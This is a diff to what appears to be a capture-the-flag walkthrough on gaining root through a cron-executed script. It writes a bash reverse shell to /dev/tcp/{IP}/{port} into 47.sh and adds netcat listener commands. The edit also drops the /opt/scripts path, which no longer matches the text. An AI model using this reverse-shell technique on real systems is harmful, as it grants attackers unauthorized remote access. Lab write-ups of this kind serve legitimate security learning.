@@ -115,10 +115,13 @@ find / -user viktor 2>dev/null | grep .sh
 Now lets put the `bash` reverse shell script in the file, which you can get from: [GTFobins](https://gtfobins.github.io/gtfobins/bash/)
 
 ```bash
-echo "bash -c 'exec bash -i &>/dev/tcp/{IP}/{port} <&1'" > /opt/scripts/47.sh
+echo "bash -c 'exec bash -i &>/dev/tcp/{IP}/{port} <&1'" > 47.sh
 ```
 
-And wait till the scheduled process runs the script file.  
+And wait till the scheduled process runs the script file. 
+```bash
+nc -lvnp {port}
+```
 
 #### The Hint based way
 
@@ -137,7 +140,12 @@ cat /etc/crontab
 we will find that there is a scheduled process to run a script called `47.sh` in the directory `/opt/scripts`, so like the previous solution let's put the `bash` reverse shell script in it and wait till the script runs.
 
 ```bash
-echo "bash -c 'exec bash -i &>/dev/tcp/{IP}/{port} <&1'" > /opt/scripts/47.sh
+echo "bash -c 'exec bash -i &>/dev/tcp/{IP}/{port} <&1'" > 47.sh
+```
+
+And listen from another terminal
+```bash
+nc -lvnp {port}
 ```
 
 ---
